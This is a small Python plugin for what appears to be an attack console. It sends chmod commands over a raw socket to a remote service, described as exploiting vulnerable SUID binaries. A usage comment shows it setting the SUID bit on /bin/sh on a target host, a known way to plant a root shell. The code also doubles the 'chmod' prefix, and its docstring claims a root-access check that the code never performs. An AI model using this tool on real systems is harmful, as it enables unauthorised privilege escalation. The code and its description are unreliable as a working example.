from ..commands import Command
import socket


def process_lines(dst_ip, dst_port, suid_command):
    """
    Connects to a given IP and port, sends commands to exploit a vulnerable SUID binary,
    and verifies root access.

    Args:
        dst_ip (str): Target IP address.
        dst_port (int): Target port number.
        suid_command (str): Command to execute on the target system.
    """
    # Construct the payload to exploit SUID and verify root access
    data_to_send = "chmod " + f"{suid_command}\nEND"

    try:
        # Connect to the server
        client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client_socket.connect((dst_ip, int(dst_port)))

        # send data to server and print response
        client_socket.send(data_to_send.encode())
        response = client_socket.recv(2048) # Can call multiple times to get more data
        print(
            "Data received from server -->\n", response.decode()
        )  # Decode bytes to string before printing

    except Exception as e:
        print(f"An error occurred: {e}")

    finally:
        # Close the socket
        client_socket.close()


class DoChmod(Command):
    """Exploit vulnerable SUID binaries via socket communication."""

    def do_command(self, lines: str, *args):
        """
        Parses input and sends commands to exploit SUID binaries.
        """
        args = lines.split(" ", 2)
        if len(args) != 3:
            return

        dst_ip = args[0]
        dst_port = args[1]
        suid_command = args[2]

        process_lines(dst_ip, dst_port, suid_command)


command = DoChmod
# do_chmod 192.168.20.129 5050 chmod u+s /bin/sh